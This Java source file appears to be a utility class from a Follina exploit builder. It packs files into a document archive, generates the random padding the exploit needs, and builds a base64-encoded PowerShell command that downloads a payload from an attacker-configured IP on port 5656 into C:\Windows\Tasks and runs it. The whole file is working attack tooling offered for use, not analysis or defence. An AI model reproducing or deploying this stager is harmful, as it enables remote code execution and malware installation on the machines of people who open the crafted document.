package com.follina.anunnaki;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.Random;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public interface Utils {
	
	public static final short TAMPON = 1024;
	
	public static String readFileContent(String path) throws IOException {

		try (BufferedInputStream bis = new BufferedInputStream(new FileInputStream(new File(path)))) {

			int l;
			byte[] readBuff = new byte[TAMPON];
			String content = "";
			while ((l = bis.read(readBuff)) > 0)
				content += new String(readBuff, 0, l);
			return content;

		} catch (IOException e) {
			throw e;
		}
	}

	public static void writeFileContent(String path, String content) throws IOException {
		try (BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(new File(path)))) {
			bos.write(content.getBytes());
		} catch (IOException e) {
			throw e;
		}
	}

	public static void pack(String sourceDirPath, String zipFilePath) throws IOException {
		Path p = Files.createFile(Paths.get(zipFilePath));
		try (ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p))) {
			Path pp = Paths.get(sourceDirPath);
			Files.walk(pp).filter(path -> !Files.isDirectory(path)).forEach(path -> {
				ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());
				try {
					zs.putNextEntry(zipEntry);
					Files.copy(path, zs);
					zs.closeEntry();
				} catch (IOException e) {
					System.err.println(e);
				}
			});
		}
	}
	
	public static String generateRandom() {
		//I ll generate random between a-zA-z
		String randomByte = "";
		Random random = new Random();
		for(int i=0;i<4096;i++) {
			int ascii = random.nextInt(25); // Random 65 -> 90 ===> 0 -> (90 - 65)=25
			randomByte += (char)(ascii + 65) + "";
		}
		return randomByte;
	}
	
	public static String generatePayload(Configuration configuration) {
			//Now i m going to create my Http request that document world will send it to download my payload
			String payloadTemplate = "Invoke-WebRequest {{link}} -OutFile C:\\Windows\\Tasks\\{{filename}}; C:\\Windows\\Tasks\\{{filename}};";
			payloadTemplate = payloadTemplate.replace("{{link}}", "http://" + configuration.getIp() + ":5656/anunnaki/download");
			payloadTemplate = payloadTemplate.replace("{{filename}}",configuration.getFileName());
			//Now im goind to encode it to base64 to run it on my powershell
			payloadTemplate = Base64.getEncoder().encodeToString(payloadTemplate.getBytes());
			return payloadTemplate;
	}
}
